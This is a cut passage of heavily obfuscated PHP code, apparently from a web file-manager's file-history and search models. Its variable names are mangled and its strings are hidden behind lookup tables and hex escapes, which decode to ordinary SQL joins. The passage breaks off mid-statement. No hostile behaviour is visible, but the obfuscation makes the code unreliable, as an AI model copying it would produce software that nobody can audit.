$this->where($”‹¬±€Ë)->find(); if ($¥½Ÿõœ) { $ã÷äŠ–ƒ = $this->where($”‹¬±€Ë)->delete(); Model($è’–í¥³[548])->remove($¥½Ÿõœ[$è’–í¥³[545]]); return $ã÷äŠ–ƒ; } return !1; } public function removeBySource($ÁİÁƒ•Ê) { $ÁúÊÇ =& $_SERVER[ùèÅ´Ãš]; if (!$ÁİÁƒ•Ê) { return !1; } if (!is_array($ÁİÁƒ•Ê)) { $ÁİÁƒ•Ê = array($ÁİÁƒ•Ê); } $Ê«êÁ¡ = array($ÁúÊÇ[493] => array($ÁúÊÇ[7], $ÁİÁƒ•Ê)); $†ÍùÊÍ½ = $this->field($ÁúÊÇ[546])->where($Ê«êÁ¡)->select(); if ($†ÍùÊÍ½) { $this->where($Ê«êÁ¡)->delete(); $š›Ïáúº = array_to_keyvalue($†ÍùÊÍ½, $ÁúÊÇ[12], $ÁúÊÇ[545]); Model($ÁúÊÇ[548])->remove($š›Ïáúº); } return !0; } public function setDetail($†™¥Èóş, $§âïíÒ—) { $ªãÀÇ… =& $_SERVER[ùèÅ´Ãš]; return $this->where(array($ªãÀÇ…[495] => $†™¥Èóş))->save(array($ªãÀÇ…[2253] => $§âïíÒ—)); } public function rollbackToItem($ş«ÌşŸ, $á¤‹ş) { $Â©“Ò× =& $_SERVER[ùèÅ´Ãš]; $ÑÜÁ®÷ø = Model($Â©“Ò×[908])->sourceInfo($ş«ÌşŸ); $this->addHistory($ÑÜÁ®÷ø, LNG($Â©“Ò×[2264])); $ÂœµŒ“Ô = $this->find($á¤‹ş); $Ííú¸ñù = array($Â©“Ò×[545] => $ÂœµŒ“Ô[$Â©“Ò×[545]], $Â©“Ò×[79] => $ÂœµŒ“Ô[$Â©“Ò×[79]], $Â©“Ò×[88] => time(), $Â©“Ò×[531] => USER_ID); Model($Â©“Ò×[908])->where(array($Â©“Ò×[194] => $ş«ÌşŸ))->save($Ííú¸ñù); return $this->where(array($Â©“Ò×[495] => $á¤‹ş))->delete(); } public function clearSame($Ê„ ˆü) { $ôÎ²ƒ‘Œ =& $_SERVER[ùèÅ´Ãš]; $ãşÚª = $this->listData($Ê„ ˆü); $ÀÙªÑ°Œ = array_to_keyvalue_group($ãşÚª, $ôÎ²ƒ‘Œ[545]); $¤èÏ”ºè = array(); $¼Œö‡î = array(); foreach ($ÀÙªÑ°Œ as $ÄÂ‘»¯¢) { if (!$ÄÂ‘»¯¢ || count($ÄÂ‘»¯¢) <= 1) { continue; } foreach ($ÄÂ‘»¯¢ as $·ª¹û›í) { $¤èÏ”ºè[] = $·ª¹û›í[$ôÎ²ƒ‘Œ[545]]; $¼Œö‡î[] = $·ª¹û›í[$ôÎ²ƒ‘Œ[477]]; } } if (!$¼Œö‡î) { return; } $this->where(array($ôÎ²ƒ‘Œ[477] => array($ôÎ²ƒ‘Œ[7], $¼Œö‡î)))->delete(); Model($ôÎ²ƒ‘Œ[548])->remove($¤èÏ”ºè); } public function userSpace() { $…î¯¿œù =& $_SERVER[ùèÅ´Ãš]; $øëã‘ë = $this->tablePrefix; $Çâ¾³Å = array($…î¯¿œù[1788] => USER_ID); $²îê¡•ó = "{$øëã‘ë}\x69\x6f\137\146\151\154\x65\x20\146\x69\x6c\145\163\40\157\x6e\40\x66\x69\154\145\163\56\146\x69\154\145\111\104\40\75\40\x68\x69\163\164\x6f\162\171\56\146\x69\154\145\x49\104"; return $this->alias($…î¯¿œù[2262])->where($Çâ¾³Å)->join($²îê¡•ó, $…î¯¿œù[2263])->sum($…î¯¿œù[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ñ»ÇÙ»¨) { $ªŸ–¨˜› =& $_SERVER[ùèÅ´Ãš]; $İ®îÍóÕ = KodIO::fileTypeList(); $Ì¤ıû›ù = $İ®îÍóÕ[$ñ»ÇÙ»¨]; if (!$Ì¤ıû›ù) { return array(); } $ôù³¯Œí = $Ì¤ıû›ù[$ªŸ–¨˜›[169]]; $ò–Å¾¿ª = $ªŸ–¨˜›[7]; if (!$Ì¤ıû›ù[$ªŸ–¨˜›[169]]) { $şšµú‰ = array_to_keyvalue($İ®îÍóÕ, $ªŸ–¨˜›[12], $ªŸ–¨˜›[169]); $ôù³¯Œí = implode($ªŸ–¨˜›[50], $şšµú‰); $ò–Å¾¿ª = $ªŸ–¨˜›[2265]; } $—şš·³ = explode($ªŸ–¨˜›[50], trim($ôù³¯Œí, $ªŸ–¨˜›[50])); return array($ò–Å¾¿ª, $—şš·³); } public function listPathType($Ç…ØöĞ’) { $ìäç¸¨ =& $_SERVER[ùèÅ´Ãš]; $Ÿâº¯Œ = $this->fileTypeWhere($Ç…ØöĞ’); if (!$Ÿâº¯Œ) { return array(); } $ëœœ‰æù = USER_ID; $à×œ•æÅ = Model($ìäç¸¨[601])->getInfo($ëœœ‰æù); $ ‘à¢· = array($ìäç¸¨[655] => SourceModel::TYPE_USER, $ìäç¸¨[588] => array($ìäç¸¨[619], $ìäç¸¨[597] . $à×œ•æÅ[$ìäç¸¨[90]][$ìäç¸¨[194]] . $ìäç¸¨[620]), $ìäç¸¨[656] => $ëœœ‰æù, $ìäç¸¨[653] => 0, $ìäç¸¨[654] => $Ÿâº¯Œ); return $this->listSource($ ‘à¢·); } public function listSearch($šßØ½ë¡, $íÎêŠŒŞ = 300) { $Á‡¹ñ«Õ =& $_SERVER[ùèÅ´Ãš]; if (isset($šßØ½ë¡[$Á‡¹ñ«Õ[2096]]) && $šßØ½ë¡[$Á‡¹ñ«Õ[2096]]) { $šßØ½ë¡[$Á‡¹ñ«Õ[2096]] = str_replace($Á‡¹ñ«Õ[462], $Á‡¹ñ«Õ[2266], trim($šßØ½ë¡[$Á‡¹ñ«Õ[2096]])); } $—Ô¤›û™ = $this->_parseSearchWhere($šßØ½ë¡); if (!isset($—Ô¤›û™[$Á‡¹ñ«Õ[507]])) { $—Ô¤›û™[$Á‡¹ñ«Õ[507]] = 0; } $”–ì¸İº = $Á‡¹ñ«Õ[2267]; $ºÔ¹íèÀ = $—Ô¤›û™; $›·Šöôï = $”–ì¸İº; $this->_listSearchBindPinyin($šßØ½ë¡, $—Ô¤›û™, $”–ì¸İº); $this->alias($Á‡¹ñ«Õ[521])->_makeOrder(); $—Ô¤›û™ = $this->parseWhereLike($—Ô¤›û™); $æÙüÔÀÊ = $this->distinct(!0)->field($”–ì¸İº)->where($—Ô¤›û™)->selectPage($íÎêŠŒŞ); if ($GLOBALS[$Á‡¹ñ«Õ[6]][$Á‡¹ñ«Õ[459]][$Á‡¹ñ«Õ[460]] && Input::check($šßØ½ë¡[$Á‡¹ñ«Õ[2096]], $Á‡¹ñ«Õ[662]) && $æÙüÔÀÊ[$Á‡¹ñ«Õ[444]][$Á‡¹ñ«Õ[430]] == 1 && $æÙüÔÀÊ[$Á‡¹ñ«Õ[444]][$Á‡¹ñ«Õ[445]] == 0) { $æÙüÔÀÊ = $this->distinct(!0)->field($”–ì¸İº)->where($ºÔ¹íèÀ)->limit(1000)->select(); $æÙüÔÀÊ = array_page_split($æÙüÔÀÊ, !1, $íÎêŠŒŞ); } $this->_listSearchFileContent($æÙüÔÀÊ, $šßØ½ë¡, $›·Šöôï, $ºÔ¹íèÀ); $this->_listSearchDesc($æÙüÔÀÊ, $šßØ½ë¡, $›·Šöôï); $this->_listSearchTag($æÙüÔÀÊ, $šßØ½ë¡, $›·Šöôï); $this->_listSearchGroupTag($æÙüÔÀÊ, $šßØ½ë¡, $›·Šöôï); $this->_listDataApply($æÙüÔÀÊ[$Á‡¹ñ«Õ[447]]); $this->_listMake($æÙüÔÀÊ); return $æÙüÔÀÊ; } private function _listSearchFileContent(&$™•ıÅ‡¸, $œŞÁÌœ», $¸”²¬·, $ä¬•¯í¾) { $ÀÑ™ÇÀ =& $_SERVER[ùèÅ´Ãš]; if (!$œŞÁÌœ»[$ÀÑ™ÇÀ[2096]] || $™•ıÅ‡¸[$ÀÑ™ÇÀ[444]][$ÀÑ™ÇÀ[430]] > 1) { return; } if (!isset($ä¬•¯í¾[$ÀÑ™ÇÀ[32]]) || !is_array($œŞÁÌœ»[$ÀÑ™ÇÀ[545]])) { return; } $ä¬•¯í¾[$ÀÑ™ÇÀ[545]] = array($ÀÑ™ÇÀ[7], $œŞÁÌœ»[$ÀÑ™ÇÀ[545]]); unset($ä¬•¯í¾[$ÀÑ™ÇÀ[32]]); unset($œŞÁÌœ»[$ÀÑ™ÇÀ[545]]); $Èòí…¦ô = $this->field($¸”²¬·)->where($ä¬•¯í¾)->limit($ÀÑ™ÇÀ[2268])->select(); if (!$Èòí…¦ô || count($Èòí…¦ô) == 0) { return; } $™•ıÅ‡¸[$ÀÑ™ÇÀ[447]] = array_merge($Èòí…¦ô, $™•ıÅ‡¸[$ÀÑ™ÇÀ[447]]); $™•ıÅ‡¸[$ÀÑ™ÇÀ[444]][$ÀÑ™ÇÀ[445]] += count($Èòí…¦ô); } private function _listSearchTag(&$öÑÓõÂ¢, $‚››Åû, $İ€ÉÏ¿) { $¶û¹Ã÷Ï =& $_SERVER[ùèÅ´Ãš]; if (empty($‚››Åû[$¶û¹Ã÷Ï[1957]]) || !in_array($¶û¹Ã÷Ï[2269], $‚››Åû[$¶û¹Ã÷Ï[1957]])) { return; } if (!$‚››Åû[$¶û¹Ã÷Ï[2096]] || $öÑÓõÂ¢[$¶û¹Ã÷Ï[444]][$¶û¹Ã÷Ï[430]] > 1) { return; } $Ÿ­ãÚÂ¦ = Model($¶û¹Ã÷Ï[2270])->listData(); $ç™ç›Ü = array(); $Ñ «€¥· = $‚››Åû[$¶û¹Ã÷Ï[2096]]; foreach ($Ÿ­ãÚÂ¦ as $Ì‘ĞÄëŒ) { $ë›óÈ‰ = $Ì‘ĞÄëŒ[$¶û¹Ã÷Ï[32]]; $ùÚ§åß = str_replace($¶û¹Ã÷Ï[53], $¶û¹Ã÷Ï[12], Pinyin::get($ë›óÈ‰)); if (stripos($ë›óÈ‰, $Ñ «€¥·) !== !1 || stripos($ùÚ§åß, $Ñ «€¥·) !== !1) { $ç™ç›Ü[] = $Ì‘ĞÄëŒ[$¶û¹Ã÷Ï[477]]; } } if (!$ç™ç›Ü) { return; } $³Š¶‡æ  = array($¶û¹Ã÷Ï[502] => array($¶û¹Ã÷Ï[7], $ç™ç›Ü), $¶û¹Ã÷Ï[1797] => USER_ID); $ûàèßÄ» = Model($¶û¹Ã÷Ï[504])->field($¶û¹Ã÷Ï[87])->where($³Š¶‡æ )->select(); $ûàèßÄ» = array_to_keyvalue($ûàèßÄ», $¶û¹Ã÷Ï[12], $¶û¹Ã÷Ï[87]); $£÷ÍÒñã = array_unique($ûàèßÄ»); $this->_listSearchMerge($öÑÓõÂ¢, $‚››Åû, $İ€ÉÏ¿, $£÷ÍÒñã); } private function _listSearchDesc(&$ÑÙ²¬½Â, $‚ËòŸ´Ö, $óØæó¹Ñ) { $Ôˆ§Ğ Ë =& $_SERVER[ùèÅ´Ãš]; if (empty($‚ËòŸ´Ö[$Ôˆ§Ğ Ë[1957]]) || !in_array($Ôˆ§Ğ Ë[528], $‚ËòŸ´Ö[$Ôˆ§Ğ Ë[1957]])) { return; } if (!$‚ËòŸ´Ö[$Ôˆ§Ğ Ë[2096]] || $ÑÙ²¬½Â[$Ôˆ§Ğ Ë[444]][$Ôˆ§Ğ Ë[430]] > 1) { return; } $üßÆ‹â¼ = array($Ôˆ§Ğ Ë[97] => $Ôˆ§Ğ Ë[528], $Ôˆ§Ğ Ë[452] => array($Ôˆ§Ğ Ë[461], $Ôˆ§Ğ Ë[2098] . $‚ËòŸ´Ö[$Ôˆ§Ğ Ë[2096]] . $Ôˆ§Ğ Ë[2098])); $¶ö£ ô = !1; if ($¶ö£ ô) { $˜¤•…Å¡ = $this->listSearchChildren($‚ËòŸ´Ö[$Ôˆ§Ğ Ë[193]]); $˜¤•…Å¡ = array_unique($˜¤•…Å¡); if (!$˜¤•…Å¡) { return; } $üßÆ‹â¼[$Ôˆ§Ğ Ë[194]] = array($Ôˆ§Ğ Ë[7], $˜¤•…Å¡); } $¹Ø–ïòİ = Model($Ôˆ§Ğ Ë[639])->field($Ôˆ§Ğ Ë[194])->where($üßÆ‹â¼)->limit(5000)->select(); $·ş±ì¢ø = array_to_keyvalue($¹Ø–ïòİ, $Ôˆ§Ğ Ë[12], $Ôˆ§Ğ Ë[194]); $this->_listSearchMerge($ÑÙ²¬½Â, $‚ËòŸ´Ö, $óØæó¹Ñ, $·ş±ì¢ø); } private function _listSearchGroupTag(&$ˆ¥Â¢æê, $£ñÕô¸­, $ÔÉï’·) { $¾îÅâ¡ =& $_SERVER[ùèÅ´Ãš]; if (empty($£ñÕô¸­[$¾îÅâ¡[1957]]) || !in_array($¾îÅâ¡[2269], $£ñÕô¸­[$¾îÅâ¡[1957]])) { return; } if (!$£ñÕô¸­[$¾îÅâ¡[2096]] || $ˆ¥Â¢æê[$¾îÅâ¡[444]][$¾îÅâ¡[430]] > 1 || !$£ñÕô¸­[$¾îÅâ¡[193]]) { return; } $¦å°ŞĞô = $this->sourceInfo($£ñÕô¸­[$¾îÅâ¡[193]]); if (!$¦å°ŞĞô || $¦å°ŞĞô[$¾îÅâ¡[191]] != SourceModel::TYPE_GROUP) { return; } $™©ò‡®´ = $¦å°ŞĞô[$¾îÅâ¡[573]]; $‰¨¿œ£ = Model($¾îÅâ¡[2271])->get($™©ò‡®´); $İÔø›ÍÍ = array(); $‚à­ùÈ = $£ñÕô¸­[$¾îÅâ¡[2096]]; foreach ($‰¨¿œ£[$¾îÅâ¡[447]] as $š‘™÷¿) { $ıË£îÑ¿ = $š‘™÷¿[$¾îÅâ¡[32]]; $ÉªÑÛÅ = str_replace($¾îÅâ¡[53], $¾îÅâ¡[12], Pinyin::get($ıË£îÑ¿)); if (stripos($ıË£îÑ¿, $‚à­ùÈ) !== !1 || stripos($ÉªÑÛÅ, $‚à­ùÈ) !== !1) { $İÔø›ÍÍ[] = $š‘™÷¿[$¾îÅâ¡[477]]; } } if (!$İÔø›ÍÍ) { return; } $´Û³–åŸ = array($¾îÅâ¡[502] => array($¾îÅâ¡[7], $İÔø›ÍÍ), $¾îÅâ¡[1797] => 0, $¾îÅâ¡[33] => $¾îÅâ¡[1400] . $™©ò‡®´); $‡æ›çó½ = Model($¾îÅâ¡[504])->field($¾îÅâ¡[87])->where($´Û³–åŸ)->select(); $‡æ›çó½ = array_to_keyvalue($‡æ›çó½, $¾îÅâ¡[12], $¾îÅâ¡[87]); $†ŞÏĞòÓ = array_unique($‡æ›çó½); $this->_listSearchMerge($ˆ¥Â¢æê, $£ñÕô¸­, $ÔÉï’·, $†ŞÏĞòÓ); } private function _listSearchMerge(&$øò§‹Äê, $¸Øı’ò¨, $€¨—ß, $Û÷Í§á¹) { $†Šì¼°‰ =& $_SERVER[ùèÅ´Ãš]; if (!$Û÷Í§á¹) { return; } $´’ŞÎ³ˆ = array_to_keyvalue($øò§‹Äê[$†Šì¼°‰[447]], $†Šì¼°‰[12], $†Šì¼°‰[194]); $»ÙµĞÅé = array_diff($Û÷Í§á¹, $´’ŞÎ³ˆ); if (!$»ÙµĞÅé) { return; } $ƒğš½ˆ = array($†Šì¼°‰[194] => array($†Šì¼°‰[7], $»ÙµĞÅé)); $šæöÚ‘À = $this->field($€¨—ß)->where($ƒğš½ˆ)->select(); if (!$šæöÚ‘À) { return; } $ãë‡‹ì½ = array(); foreach ($šæöÚ‘À as $öñ—ßèß) { if ($this->_listSearchFilter($öñ—ßèß, $¸Øı’ò¨)) { $ãë‡‹ì½[] = $öñ—ßèß; } } $øò§‹Äê[$†Šì¼°‰[447]] = array_merge($ãë‡‹ì½, $øò§‹Äê[$†Šì¼°‰[447]]); $øò§‹Äê[$†Šì¼°‰[444]][$†Šì¼°‰[445]] += count($ãë‡‹ì½); } private function _listSearchFilter($× º§Úá, $‰¿ •áº) { $šÕ£Ûşâ =& $_SERVER[ùèÅ´Ãš]; $…îÃÎ—† = $× º§Úá[$šÕ£Ûşâ[487]] == $šÕ£Ûşâ[91]; if (!strstr($× º§Úá[$šÕ£Ûşâ[588]], $šÕ£Ûşâ[50] . $‰¿ •áº[$šÕ£Ûşâ[193]] . $šÕ£Ûşâ[50])) { return !1; } if (isset($‰¿ •áº[$šÕ£Ûşâ[488]]) && $‰¿ •áº[$šÕ£Ûşâ[488]] != $šÕ£Ûşâ[854]) { if ($‰¿ •áº[$šÕ£Ûşâ[488]] == $šÕ£Ûşâ[78] && !$…îÃÎ—†) { return !1; } if ($‰¿ •áº[$šÕ£Ûşâ[488]] != $šÕ£Ûşâ[78] && $…îÃÎ—†) { return !1; } if (!strstr($× º§Úá[$šÕ£Ûşâ[169]], $šÕ£Ûşâ[50] . $‰¿ •áº[$šÕ£Ûşâ[488]] . $šÕ£Ûşâ[50])) { return !1; } } if (isset($‰¿ •áº[$šÕ£Ûşâ[2272]]) && $‰¿ •áº[$šÕ£Ûşâ[2272]] < $× º§Úá[$šÕ£Ûşâ[79]]) { return !1; } if (isset($‰¿ •áº[$šÕ£Ûşâ[2273]]) && $‰¿ •áº[$šÕ£Ûşâ[2273]] > $× º§Úá[$šÕ£Ûşâ[79]]) { return !1; } if (isset($‰¿ •áº[$šÕ£Ûşâ[669]]) && $‰¿ •áº[$šÕ£Ûşâ[669]] != $× º§Úá[$šÕ£Ûşâ[531]]) { return !1; } return !0; } public function listSearchChildren($ËÌ÷¥ßÏ, $åù°ÊÍ = 5000) { $òûÁ²Â =& $_SERVER[ùèÅ´Ãš]; $–»§—²Á = array(); $ÄÒ“ƒÁĞ = $this->sourceInfo($ËÌ÷¥ßÏ); $³šˆõğ¾ = array($òûÁ²Â[588] => array($òûÁ²Â[461], $ÄÒ“ƒÁĞ[$òûÁ²Â[588]] . $ÄÒ“ƒÁĞ[$òûÁ²Â[194]] . $òûÁ²Â[620])); $Ÿ£ãóÆÒ = $this->field($òûÁ²Â[79])->where($³šˆõğ¾)->limit($åù°ÊÍ + 1)->select(); $œÄÃ»æ = is_array($Ÿ£ãóÆÒ) ? count($Ÿ£ãóÆÒ) : 0; if ($œÄÃ»æ > $åù°ÊÍ) { return $this->_listSearchChildrenNear($ËÌ÷¥ßÏ, $åù°ÊÍ); } $©œ²áüË = $this->field($òûÁ²Â[194])->where($³šˆõğ¾)->select(); $–»§—²Á = array_to_keyvalue($©œ²áüË, $òûÁ²Â[12], $òûÁ²Â[194]); return $–»§—²Á; } private function _listSearchChildrenNear($º©ò²÷ª, $úƒ¯Ó°ö) { $™êµ­ =& $_SERVER[ùèÅ´Ãš]; $íÖª§ş¶ = array(); $™¦å‡ = array($™êµ­[193] => $º©ò²÷ª); $‰Ä·é­É = $this->field($™êµ­[2274])->where($™¦å‡)->select(); $¸¡ììŠ² = array_to_keyvalue(array_filter_by_field($‰Ä·é­É, $™êµ­[487], $™êµ­[91]), $™êµ­[12], $™êµ­[194]); $íÖª§ş¶ = array_merge($íÖª§ş¶, array_to_keyvalue($‰Ä·é­É, $™êµ­[12], $™êµ­[194])); if (!$¸¡ììŠ²) { return $íÖª§ş¶; } $™¦å‡ = array($™êµ­[193] => array($™êµ­[7], $¸¡ììŠ²)); $‰Ä·é­É = $this->field($™êµ­[2274])->where($™¦å‡)->limit($úƒ¯Ó°ö)->select(); $íÖª§ş¶ = array_merge($íÖª§ş¶, array_to_keyvalue($‰Ä·é­É, $™êµ­[12], $™êµ­[194])); $íÖª§ş¶ = array_slice($íÖª§ş¶, 0, intval($úƒ¯Ó°ö)); return $íÖª§ş¶; } private function _listSearchBindPinyin($È¾ªÒ¾¯, &$È½‰¸, &$Ã†º€á) { $è£°Ü½à =& $_SERVER[ùèÅ´Ãš]; if (!isset($È¾ªÒ¾¯[$è£°Ü½à[2096]]) || !$È¾ªÒ¾¯[$è£°Ü½à[2096]]) { return; } if (!Input::check($È¾ªÒ¾¯[$è£°Ü½à[2096]], $è£°Ü½à[395]) || strlen($È¾ªÒ¾¯[$è£°Ü½à[2096]]) < 2) { return; } $æ½ˆÏá = "\114\x45\x46\x54\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\157\x5f\163\157\x75\162\x63\x65\x5f\155\145\x74\141\x20\155\145\x74\141\40\157\x6e\40\x73\x6f\165\x72\143\145\56\163\x6f\165\x72\x63\x65\x49\x44\x20\x3d\x20\155\145\164\141\x2e\163\x6f\165\x72\x63\145\x49\104"; $úÆ…Ñáş = array(); $Ã†º€á = str_replace(array($è£°Ü½à[288], $è£°Ü½à[53], $è£°Ü½à[2275]), $è£°Ü½à[12], $Ã†º€á); $Ã†º€á = $è£°Ü½à[513] . str_replace($è£°Ü½à[50], $è£°Ü½à[514], $Ã†º€á); $ïÂ£Èõº = $È½‰¸[$è£°Ü½à[32]]; unset($È½‰¸[$è£°Ü½à[32]]); foreach ($È½‰¸ as $êª²šö => $ë®ËÃú) { $úÆ…Ñáş[$è£°Ü½à[513] . $êª²šö] = $ë®ËÃú; } foreach ($ïÂ£Èõº as $ğÃ‰ª¶¹) { $úÆ…Ñáş[] = array($è£°Ü½à[518] => $ğÃ‰ª¶¹, $è£°Ü½à[1088] => $è£°Ü½à[2100], array($è£°Ü½à[2276] => $ğÃ‰ª¶¹, $è£°Ü½à[2277] => array($è£°Ü½à[7], array($è£°Ü½à[540], $è£°Ü½à[539])))); } $this->join($æ½ˆÏá); $È½‰¸ = $úÆ…Ñáş; } private function _parseSearchWhere($°ÇğÁó¿) { $«—„ÔÛÚ =& $_SERVER[ùèÅ´Ãš]; $º‡–ì³• = array(); if (isset($°ÇğÁó¿[$«—„ÔÛÚ[838]]) && $°ÇğÁó¿[$«—„ÔÛÚ[838]]) { $º‡–ì³•[$«—„ÔÛÚ[88]] = array($«—„ÔÛÚ[2278], $°ÇğÁó¿[$«—„ÔÛÚ[838]]); } if (isset($°ÇğÁó¿[$«—„ÔÛÚ[839]]) && $°ÇğÁó¿[$«—„ÔÛÚ[839]]) { $Ì‡Ÿ½²Ó = array($«—„ÔÛÚ[2279], $°ÇğÁó¿[$«—„ÔÛÚ[839]]); if ($º‡–ì³•[$«—„ÔÛÚ[88]]) { $º‡–ì³•[$«—„ÔÛÚ[88]] = array($º‡–ì³•[$«—„ÔÛÚ[88]], $Ì‡Ÿ½²Ó, $«—„ÔÛÚ[2280]); } else { $º‡–ì³•[$«—„ÔÛÚ[88]] = $Ì‡Ÿ½²Ó; } } if (isset($°ÇğÁó¿[$«—„ÔÛÚ[2272]]) && $°ÇğÁó¿[$«—„ÔÛÚ[2272]] > 0) { $º‡–ì³•[$«—„ÔÛÚ[79]] = array($«—„ÔÛÚ[2278], $°ÇğÁó¿[$«—„ÔÛÚ[2272]]); } if (isset($°ÇğÁó¿[$«—„ÔÛÚ[2273]]) && $°ÇğÁó¿[$«—„ÔÛÚ[2273]]) { $Ì‡Ÿ½²Ó = array($«—„ÔÛÚ[2279], $°ÇğÁó¿[$«—„ÔÛÚ[2273]]); if ($º‡–ì³•[$«—„ÔÛÚ[79]]) { $º‡–ì³•[$«—„ÔÛÚ[79]] = array($º‡–ì³•[$«—„ÔÛÚ[79]], $Ì‡Ÿ½²Ó, $«—„ÔÛÚ[2280]); } else { $º‡–ì³•[$«—„ÔÛÚ[79]] = $Ì‡Ÿ½²Ó; } } if (isset($°ÇğÁó¿[$«—„ÔÛÚ[669]]) && $°ÇğÁó¿[$«—„ÔÛÚ[669]]) { $º‡–ì³•[] = array($«—„ÔÛÚ[531] => $°ÇğÁó¿[$«—„ÔÛÚ[669]], $«—„ÔÛÚ[529] => $°ÇğÁó¿[$«—„ÔÛÚ[669]], $«—„ÔÛÚ[1088] => $«—„ÔÛÚ[2100]); } if (isset($°ÇğÁó¿[$«—„ÔÛÚ[488]]) && $°ÇğÁó¿[$«—„ÔÛÚ[488]]) { $Ê‘û‰–Â = $°ÇğÁó¿[$«—„ÔÛÚ[488]]; if ($Ê‘û‰–Â == $«—„ÔÛÚ[78]) { $º‡–ì³•[$«—„ÔÛÚ[487]] = 1; } else { if ($Ê‘û‰–Â == $«—„ÔÛÚ[2281]) { $º‡–ì³•[$«—„ÔÛÚ[487]] = 0; } else { if ($Ê‘û‰–Â) { $Ê‘û‰–Â = is_array($Ê‘û‰–Â) ? $Ê‘û‰–Â : explode($«—„ÔÛÚ[50], $Ê‘û‰–Â); $º‡–ì³•[$«—„ÔÛÚ[488]] = array($«—„ÔÛÚ[494], $Ê‘û‰–Â); $º‡–ì³•[$«—„ÔÛÚ[487]] = 0; } } } } $this->_parseSearchParent($°ÇğÁó¿, $º‡–ì³•); if (isset($°ÇğÁó¿[$«—„ÔÛÚ[2096]]) && trim($°ÇğÁó¿[$«—„ÔÛÚ[2096]])) { $×ƒ¾Òû = trim($°ÇğÁó¿[$«—„ÔÛÚ[2096]]); $İ“’›¿Ø = explode($«—„ÔÛÚ[53], $×ƒ¾Òû); if (strlen($×ƒ¾Òû) > 2 && (substr($×ƒ¾Òû, 0, 1) == $«—„ÔÛÚ[121] && substr($×ƒ¾Òû, -1) == $«—„ÔÛÚ[121]) || substr($×ƒ¾Òû, 0, 1) == $«—„ÔÛÚ[58] && substr($×ƒ¾Òû, -1) == $«—„ÔÛÚ[58]) { $×ƒ¾Òû = substr($×ƒ¾Òû, 1, -1); $İ“’›¿Ø = array($×ƒ¾Òû); } $º‡–ì³•[$«—„ÔÛÚ[32]] = array(array($«—„ÔÛÚ[619], $«—„ÔÛÚ[2098] . $×ƒ¾Òû . $«—„ÔÛÚ[2098])); if (count($İ“’›¿Ø) > 1) { $º‡–ì³•[$«—„ÔÛÚ[32]] = array(); foreach ($İ“’›¿Ø as $ø¬¶Şé„) { if (!trim($ø¬¶Şé„)) { continue; } $º‡–ì³•[$«—„ÔÛÚ[32]][] = array($«—„ÔÛÚ[619], $«—„ÔÛÚ[2098] . trim($ø¬¶Şé„) . $«—„ÔÛÚ[2098]); } } } return $º‡–ì³•; } private function _parseSearchParent($Ä¡¶èãŞ, &$³œí¤†ù) { $¹‹ëè€ =& $_SERVER[ùèÅ´Ãš]; if (!isset($Ä¡¶èãŞ[$¹‹ëè€[193]]) || !$Ä¡¶èãŞ[$¹‹ëè€[193]]) { return; } $ğ ¹Ö¿ = $this->pathInfo($Ä¡¶èãŞ[$¹‹ëè€[193]]); $ô¤³Ó‹ï = $ğ ¹Ö¿[$¹‹ëè€[193]] . $¹‹ëè€[12] === $¹‹ëè€[231]; $“Ö–¶Ôß = $ğ ¹Ö¿[$¹‹ëè€[191]] == $¹‹ëè€[582]; if ($ğ ¹Ö¿[$¹‹ëè€[598]] == $¹‹ëè€[599]) { $ÄÜ£—ºÙ = $this->sourceInfo($Ä¡¶èãŞ[$¹‹ëè€[193]]); $ğ ¹Ö¿[$¹‹ëè€[588]] = $ÄÜ£—ºÙ[$¹‹ëè€[588]]; } $³œí¤†ù[$¹‹ëè€[659]] = array($¹‹ëè€[619], $ğ ¹Ö¿[$¹‹ëè€[588]] . $Ä¡¶èãŞ[$¹‹ëè€[193]] . $¹‹ëè€[620]); $ÒŸŸÅò = isset($Ä¡¶èãŞ[$¹‹ëè€[1957]]) && in_array($¹‹ëè€[582], $Ä¡¶èãŞ[$¹‹ëè€[1957]]); if (!$ÒŸŸÅò || !$“Ö–¶Ôß || !$ô¤³Ó‹ï || !$ğ ¹Ö¿[$¹‹ëè€[489]]) { return; } if (!AuthModel::authCheckRoot($ğ ¹Ö¿[$¹‹ëè€[489]][$¹‹ëè€[490]])) { return; } $Ï¬Ó€½½ = $ğ ¹Ö¿[$¹‹ëè€[573]] . $¹‹ëè€[12]; if ($Ï¬Ó€½½ == $¹‹ëè€[91]) { unset($³œí¤†ù[$¹‹ëè€[659]]); $³œí¤†ù[$¹‹ëè€[191]] = self::TYPE_GROUP; return; } $ì«ÒŒàÁ = Model($¹‹ëè€[589])->groupChildrenAll($Ï¬Ó€½½); $ªÆ„ã‹Ã = count($ì«ÒŒàÁ); if ($ªÆ„ã‹Ã <= 1) { return; } $îÆ®”šÙ = array($¹‹ëè€[193] => 0, $¹‹ëè€[191] => self::TYPE_GROUP, $¹‹ëè€[573] => array($¹‹ëè€[7], $ì«ÒŒàÁ)); $ÛøšğœÛ = $this->field($¹‹ëè€[2282])->where($îÆ®”šÙ)->limit($ªÆ„ã‹Ã)->select(); $³œí¤†ù[$¹‹ëè€[659]] = array(); foreach ($ÛøšğœÛ as $°¬İ¢ô) { $³œí¤†ù[$¹‹ëè€[659]][] = array($¹‹ëè€[619], $¹‹ëè€[597] . $°¬İ¢ô[$¹‹ëè€[194]] . $¹‹ëè€[620]); } $³œí¤†ù[$¹‹ëè€[659]][] = $¹‹ëè€[2100]; } } goto cÓÈìéƒ£; Dİ‰Ú‹çêë: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Í†—–ÜÔ, $õø½ÀŠë = 5.0) { if (!$Í†—–ÜÔ) { return; } $Ç¡‘ ÎÇ = Cache::get($Í†—–ÜÔ); if (!$Ç¡‘ ÎÇ || timeFloat() - floatVal($Ç¡‘ ÎÇ) >= $õø½ÀŠë) { Cache::set($Í†—–ÜÔ, timeFloat(), $õø½ÀŠë * 10); return !0; } return !1; } public static function timeLimitCall($Ş¨¶¢´Ş, $ÊµõÎ„È, $ÂÉØ¥´Î, $¤øòĞùÇ = 5.0) { $·ÎæƒÆ© =& $_SERVER[ùèÅ´Ãš]; if (!$Ş¨¶¢´Ş || !$ÊµõÎ„È) { return; } self::$asyncAdd = !0; $««õØãã = $·ÎæƒÆ©[1905]; $ŠóÜÃ·ı = Cache::get($««õØãã, !0); $ëˆôÒÆ = array($·ÎæƒÆ©[1906] => timeFloat(), $·ÎæƒÆ©[1907] => timeFloat(), $·ÎæƒÆ©[344] => 